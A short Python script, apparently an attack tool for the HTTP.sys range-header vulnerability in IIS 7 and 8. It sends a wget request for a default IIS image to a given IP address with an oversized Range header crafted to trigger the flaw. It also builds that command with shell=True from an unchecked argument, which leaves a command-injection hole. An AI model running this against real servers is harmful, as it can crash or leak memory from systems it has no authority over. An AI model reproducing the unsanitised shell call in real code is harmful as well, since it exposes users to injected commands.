import sys
import subprocess

if len(sys.argv) != 4 or sys.argv[1] != "--iisversion":
    print("Usage: python3 httpsys.py --iisversion <version> <ip_address>")
    sys.exit(1)

iis_version = sys.argv[2]
ip_address = sys.argv[3]

if iis_version not in ["7", "8"]:
    print("Invalid IIS version. Supported versions are 7 and 8.")
    sys.exit(1)

file_to_download = "welcome.png" if iis_version == "7" else "iis-85.png"
command = f'wget --header="Range: bytes=18-18446744073709551615" http://{ip_address}/{file_to_download}'

try:
    subprocess.run(command, shell=True, check=True)
except subprocess.CalledProcessError as e:
    print(f"An error occurred: {e}")
